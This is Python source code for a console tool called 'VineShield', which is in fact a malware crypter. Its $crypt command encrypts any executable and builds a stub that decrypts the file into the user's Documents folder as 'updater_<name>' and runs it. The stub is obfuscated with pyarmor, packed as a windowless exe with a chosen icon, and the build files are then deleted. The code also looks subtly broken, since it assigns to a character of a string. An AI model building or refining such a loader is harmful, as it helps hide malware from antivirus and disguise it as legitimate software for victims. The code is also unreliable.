'''
 __      __ _                _____  _      _        _      _ 
 \ \    / /(_)              / ____|| |    (_)      | |    | |
  \ \  / /  _  _ __    ___ | (___  | |__   _   ___ | |  __| |
   \ \/ /  | || '_ \  / _ \ \___ \ | '_ \ | | / _ \| | / _` |
    \  /   | || | | ||  __/ ____) || | | || ||  __/| || (_| |
     \/    |_||_| |_| \___||_____/ |_| |_||_| \___||_| \__,_| 
                 
by Nick-Vinesmoke
github: https://github.com/Nick-Vinesmoke
original: https://github.com/Nick-Vinesmoke/VineShield
'''
import os
from getpass import getuser
import webbrowser
from cryptography.fernet import Fernet

class style():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    VIOLET = '\33[35m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    GREY    = '\33[90m'


class Funcs:
    def Help():
        commandsList = '''
$help\n\tshow commands list
$exit\n\texit from app
$author\n\topen author`s github
$crypt\n\tcrypt file
$dependencies\n\tinstall all dependencies
        '''
        print(style.GREY+commandsList)
    
    def Author():
        webbrowser.open('https://github.com/Nick-Vinesmoke', new=2)

    def Dependencies():
        os.system('''start /wait cmd /c pip install pyinstaller pip install cryptography''')
    
    def Crypt():
        print(style.BLUE+"[?]path to file for crypt",end="")
        print(style.VIOLET+">>> ",end="")
        file_crypt = str(input(style.CYAN))
        file_crypt[1] = file_crypt[0].split('/')[-1]
        print(style.BLUE+"[?]name of build",end="")
        print(style.VIOLET+">>> ",end="")
        name = str(input(style.CYAN))
        print(style.BLUE+"[?]path to icon(necessarily)",end="")
        print(style.VIOLET+">>> ",end="")
        icon = str(input(style.CYAN))
        input(style.YELLOW+"[i]press enter to start")

        key = Fernet.generate_key()
        f = Fernet(key)

        with open(file_crypt[0], 'rb') as file:
            file_data = file.read()

        encrypted_data = f.encrypt(file_data)
        
        new_name = f.encrypt(file_crypt[1].encode())

        with open(f"enc_{file_crypt[1]}", 'wb') as file:
            file.write(encrypted_data)

        code = fr'''
from cryptography.fernet import Fernet
import os, sys

key = {key}
f = Fernet(key)

name = f.decrypt({new_name}).decode()
try:
    base_path = sys._MEIPASS
except Exception:
    base_path = os.path.abspath(".")
sa = os.path.join(base_path, "enc_" + name)



with open(sa, 'rb') as file:
    encrypted_data = file.read()

decrypted_data = f.decrypt(encrypted_data)

with open(r"C:\Users\\" + os.environ.get('USERNAME') + r"\Documents\updater_" + name, 'wb') as file:
    file.write(decrypted_data)
os.system(r"C:\Users\\" + os.environ.get('USERNAME') + r"\Documents\updater_" + name)
'''
        
        batCode = fr'''
@echo off >> log.txt
chcp 65001 >> log.txt
color 2 >> log.txt
setlocal enabledelayedexpansion >> log.txt
set progress=0 >> log.txt
set max=100 >> log.txt
echo Progress: [0%%]
pyarmor gen "{name}.py" >> log.txt
echo Progress: [10%%]
cd dist >> log.txt
echo Progress: [40%%]
pyinstaller -F -w -i "{icon}" --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt[1]};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" --hidden-import "tkinter" --hidden-import "tkinter.messagebox" "{name}.py" >> log.txt
cd dist >> log.txt
echo Progress: [80%%]
mkdir ..\..\build\ >> log.txt
move "{name}.exe" ../../build >> log.txt
cd ../../ >> log.txt
RD /s /q dist >> log.txt
RD /s /q __pycache__ >> log.txt
del /s /q "enc_{file_crypt[1]}" >> log.txt
del /s /q "{name}.py" >> log.txt
del /s /q "{name}.bat" >> log.txt
echo "Progress: [100%%]"
echo "The scripted build file is located in the build/ folder"
pause'''

        with open(f"{name}.py", 'w', encoding='utf-8') as f:
            f.write(code)

        with open(f"{name}.bat", 'w', encoding='utf-8') as f:
            f.write(batCode)

        f = open("log.txt", 'w', encoding='utf-8')
        f.close()

        os.startfile(f"{name}.bat")



class VineShield:
    def __init__(self) -> None:
        self.Menu()
    def Menu(self) -> None:
        logo = ''' __      __ _                _____  _      _        _      _ 
 \ \    / /(_)              / ____|| |    (_)      | |    | |
  \ \  / /  _  _ __    ___ | (___  | |__   _   ___ | |  __| |
   \ \/ /  | || '_ \  / _ \ \___ \ | '_ \ | | / _ \| | / _` |
    \  /   | || | | ||  __/ ____) || | | || ||  __/| || (_| |
     \/    |_||_| |_| \___||_____/ |_| |_||_| \___||_| \__,_|'''
        print(style.BLUE+logo)
        self.user = getuser()
        print(style.BLUE+"Welcome to VineShield,",self.user+"!")
        print(style.YELLOW+"[i]type \"$help\" to get commands list\n")
        self.GetInput()

    def GetInput(self) -> None:
        while True:
            print(style.GREEN+self.user,end="~")
            print(style.VIOLET+">>> ",end="")
            command = str(input(style.CYAN))
            self.CommandProc(command)

    def CommandProc(self, command) -> None:
        if(command[0] == "$"):
            command = command[1:]
            match command:
                case "help":
                    Funcs.Help()
                case "exit":
                    exit(0)
                case "author":
                    Funcs.Author()
                case "crypt":
                    Funcs.Crypt()
                case  "dependencies":
                    Funcs.Dependencies()
                case _:
                    print(style.RED+"[!]Error unknown service command")
                    print(style.YELLOW+"[i]type \"$help\" to get commands list\n")
        else:
            print(style.RED+"[!]Error not service command")



if __name__ == "__main__":
    VineShield()